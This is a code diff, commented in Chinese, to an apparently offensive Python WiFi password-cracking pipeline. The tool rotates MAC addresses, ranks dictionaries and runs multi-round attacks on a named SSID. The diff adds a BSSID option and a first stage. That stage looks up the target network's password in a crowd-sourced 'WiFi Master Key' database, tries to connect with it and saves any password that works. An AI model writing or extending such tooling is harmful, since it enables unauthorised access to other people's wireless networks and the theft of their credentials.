@@ -486,7 +486,7 @@ def _rotate_mac(interface="en0"):
 # 主流水线
 # ============================================================
 def run_pipeline(ssid, interface="en0", delay=0.5, mac_rotate=0,
-                 start_round=0, max_rounds=None):
+                 start_round=0, max_rounds=None, bssid=""):
     """
     执行完整的自动化多轮破解流水线
 
@@ -497,6 +497,7 @@ def run_pipeline(ssid, interface="en0", delay=0.5, mac_rotate=0,
         mac_rotate: MAC轮换间隔（0=不轮换）
         start_round: 从第几轮开始（支持断点续传）
         max_rounds: 最多执行几轮（默认全部）
+        bssid: 目标BSSID/MAC地址（用于万能钥匙查询）
     """
     # 检查是否已破解
     if is_already_cracked(ssid):
@@ -506,6 +507,32 @@ def run_pipeline(ssid, interface="en0", delay=0.5, mac_rotate=0,
         print(f"    密码: {info['password']}")
         print(f"    时间: {info.get('time', 'N/A')}{RESET}")
         return True
+
+    # ============================================================
+    # 阶段0: WiFi万能钥匙密码库预查询（秒级）
+    # ============================================================
+    if bssid:
+        print(f"{BOLD}{MAGENTA}  ── 阶段0: WiFi万能钥匙密码库查询（秒级） ──{RESET}")
+        try:
+            sys.path.insert(0, str(SCRIPT_DIR))
+            from wifi_db_query import query_wifi_masterkey
+            sys.stdout.write(f"  {ssid:<24} 查询万能钥匙...")
+            sys.stdout.flush()
+            pwd = query_wifi_masterkey(ssid, bssid)
+            if pwd:
+                from wifi_cracker import try_connect
+                ok, _ = try_connect(ssid, pwd, interface)
+                if ok:
+                    _save_cracked(ssid, pwd)
+                    print()
+                    print(f"  {GREEN}{BOLD}>>> 万能钥匙命中！SSID: {ssid}  密码: {pwd}{RESET}")
+                    return True
+            print(f"\r  {ssid:<24} 万能钥匙未收录")
+        except ImportError:
+            print(f"  {YELLOW}[!] 万能钥匙模块不可用{RESET}")
+        except Exception:
+            print(f"\r  {ssid:<24} 万能钥匙查询失败")
+        print()
 
     # 识别路由器品牌
     brand_key, strategy = detect_router_brand(ssid)
@@ -674,6 +701,8 @@ def main():
     parser.add_argument("--resume", action="store_true", help="从上次断点继续")
     parser.add_argument("--preprocess", action="store_true",
                         help="预处理：对字典进行Markov排序")
+    parser.add_argument("--bssid", type=str, default="",
+                        help="目标BSSID/MAC地址（用于万能钥匙查询）")
     parser.add_argument("--show-plan", action="store_true",
                         help="仅显示攻击计划，不执行")
     args = parser.parse_args()
@@ -728,6 +757,7 @@ def main():
         mac_rotate=args.mac_rotate,
         start_round=start_round,
         max_rounds=args.max_rounds,
+        bssid=args.bssid,
     )
     sys.exit(0 if success else 1)
 
